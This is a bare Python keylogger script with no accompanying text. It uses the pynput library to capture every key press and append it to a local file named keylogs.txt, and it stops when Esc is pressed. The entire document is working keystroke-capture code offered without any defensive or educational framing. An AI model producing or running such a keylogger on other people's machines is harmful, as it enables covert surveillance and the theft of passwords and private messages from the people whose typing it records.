from pynput import keyboard
import os
import time

def on_press(key):
    try:
        with open('keylogs.txt', 'a') as f:
            if hasattr(key, 'char'):
                f.write(key.char)
            else:
                f.write('[{}]'.format(key))
    except IOError as e:
        print("I/O error({0}): {1}".format(e.errno, e.strerror))

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    while True:
        try:
            with open('keylogs.txt', 'a') as f:
                pass
            break
        except IOError as e:
            if e.errno == 13: # Permission denied error code on Windows
                print("File is locked, waiting...")
                time.sleep(1)
    listener.join()